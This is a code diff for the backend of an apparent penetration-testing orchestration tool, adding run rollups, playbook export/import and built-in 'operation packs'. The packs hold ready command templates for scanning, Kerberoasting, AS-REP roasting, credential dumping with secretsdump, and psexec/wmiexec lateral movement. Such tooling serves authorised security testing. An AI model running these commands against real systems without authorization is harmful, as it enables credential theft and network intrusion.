@@ -1,8 +1,11 @@
 import asyncio
+import io
+import json
 from datetime import datetime, timezone
 from uuid import uuid4
 
-from fastapi import APIRouter, Depends, HTTPException
+from fastapi import APIRouter, Depends, File, HTTPException, UploadFile
+from fastapi.responses import StreamingResponse
 from pydantic import BaseModel, Field
 from sqlalchemy.orm import Session
 
@@ -863,6 +866,27 @@ def _playbook_run_dict(run: models.PlaybookRun) -> dict:
     }
 
 
+_ROLLUP_KEYS = [
+    "hosts_found", "hosts_created", "hosts_updated", "hosts_pwned", "hosts_valid",
+    "hosts_failed", "hosts_success", "findings_created", "findings_found",
+    "creds_created", "paths_found", "urls_found",
+]
+
+
+def _aggregate_run_results(db: Session, job_ids: list[str]) -> dict:
+    totals: dict[str, int] = {}
+    for jid in job_ids:
+        job = db.query(models.Job).filter(models.Job.id == jid).first()
+        if not job or not job.result_json:
+            continue
+        rj = job.result_json or {}
+        for key in _ROLLUP_KEYS:
+            val = rj.get(key) or (rj.get("structured", {}) or {}).get("counts", {}).get(key)
+            if isinstance(val, (int, float)) and val > 0:
+                totals[key] = totals.get(key, 0) + int(val)
+    return totals
+
+
 def _update_run(db: Session, run: models.PlaybookRun, **updates) -> models.PlaybookRun:
     for key, value in updates.items():
         setattr(run, key, value)
@@ -1157,14 +1181,16 @@ async def _run_sequence(run_id: str, job_ids: list[str], steps: list[dict]) -> N
         job_id = job_ids[idx]
         step = steps[idx] if idx < len(steps) else {}
         db = SessionLocal()
+        run_pid = ""
         try:
             run = db.query(models.PlaybookRun).filter(models.PlaybookRun.id == run_id).first()
             if not run or run.status == "cancelled":
                 return
+            run_pid = run.pid
         finally:
             db.close()
 
-        schedule_job_run(job_id)
+        schedule_job_run(job_id, pid=run_pid)
         result = await _wait_for_job(job_id, run_id)
         completed.append(result)
         condition_idx, condition_stop = _resolve_result_condition_target(step, result or {}, status=result.get("status"), total_steps=total_steps)
@@ -1179,7 +1205,7 @@ async def _run_sequence(run_id: str, job_ids: list[str], steps: list[dict]) -> N
                         run,
                         status=terminal,
                         finished_at=_now(),
-                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "job_count": len(completed), "condition_stop": True},
+                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "job_count": len(completed), "condition_stop": True, "rollup": _aggregate_run_results(db, [i.get("id") for i in completed if i.get("id")])},
                     )
             finally:
                 db.close()
@@ -1204,7 +1230,7 @@ async def _run_sequence(run_id: str, job_ids: list[str], steps: list[dict]) -> N
                         status=terminal,
                         finished_at=_now(),
                         error_output=f"Step job {job_id} ended with status {result.get('status')}",
-                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "failed_job_id": job_id},
+                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "failed_job_id": job_id, "rollup": _aggregate_run_results(db, [i.get("id") for i in completed if i.get("id")])},
                     )
             finally:
                 db.close()
@@ -1220,7 +1246,7 @@ async def _run_sequence(run_id: str, job_ids: list[str], steps: list[dict]) -> N
                         run,
                         status="done",
                         finished_at=_now(),
-                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "job_count": len(completed)},
+                        result_json={"completed_jobs": [item.get("id") for item in completed], "failed_jobs": [item.get("id") for item in failed], "job_count": len(completed), "rollup": _aggregate_run_results(db, [i.get("id") for i in completed if i.get("id")])},
                     )
             finally:
                 db.close()
@@ -1614,3 +1640,220 @@ async def _launch_playbook_run(pid: str, playbook_id: str, body_dict: dict, crea
         return None
     finally:
         db.close()
+
+
+# ── Custom playbook export / import ──────────────────────────────────────────
+
+@router.get("/api/playbooks/custom/export")
+def export_custom_playbooks(
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    items = db.query(models.CustomPlaybook).order_by(models.CustomPlaybook.title).all()
+    data = [
+        {"title": p.title, "description": p.description, "steps": p.steps_json or []}
+        for p in items
+    ]
+    payload = json.dumps({"format": "rootnotes-playbooks", "version": "1", "playbooks": data}, ensure_ascii=False, indent=2).encode()
+    return StreamingResponse(io.BytesIO(payload), media_type="application/json",
+                             headers={"Content-Disposition": 'attachment; filename="custom_playbooks.json"'})
+
+
+@router.post("/api/playbooks/custom/import", status_code=201)
+async def import_custom_playbooks(
+    file: UploadFile = File(...),
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    raw = json.loads((await file.read()).decode())
+    items = raw if isinstance(raw, list) else raw.get("playbooks", [])
+    now = datetime.now(timezone.utc).isoformat()
+    created = skipped = 0
+    existing_titles = {p.title.strip().lower() for p in db.query(models.CustomPlaybook).all()}
+    for item in items:
+        title = (item.get("title") or "").strip()
+        if not title or title.lower() in existing_titles:
+            skipped += 1
+            continue
+        db.add(models.CustomPlaybook(
+            id=f"pbk_{uuid4().hex[:10]}",
+            title=title,
+            description=item.get("description", ""),
+            steps_json=item.get("steps", []),
+            created_by=user.username,
+            created_at=now,
+            updated_at=now,
+        ))
+        existing_titles.add(title.lower())
+        created += 1
+    db.commit()
+    return {"created": created, "skipped": skipped}
+
+
+# ── Operation Packs ───────────────────────────────────────────────────────────
+
+_BUILTIN_PACKS = [
+    {
+        "id": "pack_builtin_initial_recon",
+        "name": "Initial Recon",
+        "description": "Fast host discovery + port scan + service version detection",
+        "tags": ["recon", "nmap"],
+        "steps": [
+            {"title": "Ping sweep", "connector_key": "nmap", "operation": "ping_sweep",
+             "params": {"target": "{target}"}, "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Port scan (top 1000)", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sV -sC -T4 --open --top-ports 1000"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "UDP top ports", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sU --top-ports 20 -T4"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_web_enum",
+        "name": "Web Enumeration",
+        "description": "HTTP/HTTPS service detection, directory busting, tech fingerprinting",
+        "tags": ["web", "enum"],
+        "steps": [
+            {"title": "Web port scan", "connector_key": "nmap", "operation": "scan",
+             "params": {"target": "{target}", "flags": "-sV -p 80,443,8080,8443,8000,8888 -T4"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Nikto scan", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "nikto -h {target} 2>&1 | head -100"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Gobuster dir", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_ad_enum",
+        "name": "AD Enumeration",
+        "description": "Active Directory recon: domain info, users, SPNs, delegation",
+        "tags": ["ad", "enum", "impacket"],
+        "steps": [
+            {"title": "Domain info (crackmapexec)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "crackmapexec smb {target} 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Enumerate users (impacket)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetADUsers '{domain}/{username}:{password}' -dc-ip {target} -all 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Kerberoasting", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target} -request -outputfile /tmp/kerberoast.txt 2>&1 && echo DONE"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "AS-REP Roasting", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-GetNPUsers '{domain}/' -dc-ip {target} -no-pass -usersfile /tmp/users.txt 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_cred_dump",
+        "name": "Credential Dump",
+        "description": "Local credential harvesting: SAM, LSA, LSASS dump",
+        "tags": ["creds", "post-exploitation", "impacket"],
+        "steps": [
+            {"title": "SAM dump (impacket)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-secretsdump '{domain}/{username}:{password}@{target}' -just-dc-user Administrator 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "LSA secrets", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-secretsdump '{domain}/{username}:{password}@{target}' -just-dc-ntlm 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "DPAPI secrets", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-dpapi.py masterkey -file /path/to/masterkey -sid S-1-5-21-... 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+    {
+        "id": "pack_builtin_lateral_smb",
+        "name": "Lateral Movement (SMB)",
+        "description": "Lateral movement via SMB: share enum, exec, pivot setup",
+        "tags": ["lateral", "smb", "impacket"],
+        "steps": [
+            {"title": "SMB share enum", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "crackmapexec smb {target} -u '{username}' -p '{password}' --shares 2>&1"},
+             "on_success": "next", "on_failure": "stop",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "Execute command (psexec)", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-psexec '{domain}/{username}:{password}@{target}' 'whoami /all' 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+            {"title": "WMI exec", "connector_key": "ssh_exec", "operation": "exec",
+             "params": {"command": "impacket-wmiexec '{domain}/{username}:{password}@{target}' 'whoami /all' 2>&1"},
+             "on_success": "next", "on_failure": "continue",
+             "on_success_step": None, "on_failure_step": None, "result_conditions": []},
+        ],
+    },
+]
+
+
+class OperationPackCreate(BaseModel):
+    name: str
+    description: str = ""
+    steps: list = []
+    tags: list[str] = []
+
+
+@router.get("/api/playbooks/packs")
+def list_operation_packs(
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    custom = db.query(models.OperationPack).order_by(models.OperationPack.name).all()
+    custom_out = [
+        {"id": p.id, "name": p.name, "description": p.description,
+         "steps": p.steps or [], "tags": p.tags or [],
+         "is_builtin": False, "created_by": p.created_by, "created_at": p.created_at}
+        for p in custom
+    ]
+    return {"packs": _BUILTIN_PACKS + custom_out}
+
+
+@router.post("/api/playbooks/packs", status_code=201)
+def create_operation_pack(
+    body: OperationPackCreate,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    now = datetime.now(timezone.utc).isoformat()
+    pack = models.OperationPack(
+        id=f"pack_{uuid4().hex[:10]}",
+        name=body.name,
+        description=body.description,
+        steps=body.steps,
+        tags=body.tags,
+        is_builtin=False,
+        created_by=user.username,
+        created_at=now,
+    )
+    db.add(pack)
+    db.commit()
+    db.refresh(pack)
+    return {"id": pack.id, "name": pack.name, "description": pack.description,
+            "steps": pack.steps or [], "tags": pack.tags or [],
+            "is_builtin": False, "created_by": pack.created_by, "created_at": pack.created_at}
+
+
+@router.delete("/api/playbooks/packs/{pack_id}", status_code=204)
+def delete_operation_pack(
+    pack_id: str,
+    db: Session = Depends(get_db),
+    user: models.User = Depends(get_current_user),
+):
+    pack = db.query(models.OperationPack).filter(models.OperationPack.id == pack_id).first()
+    if not pack:
+        raise HTTPException(404, "Pack not found")
+    db.delete(pack)
+    db.commit()
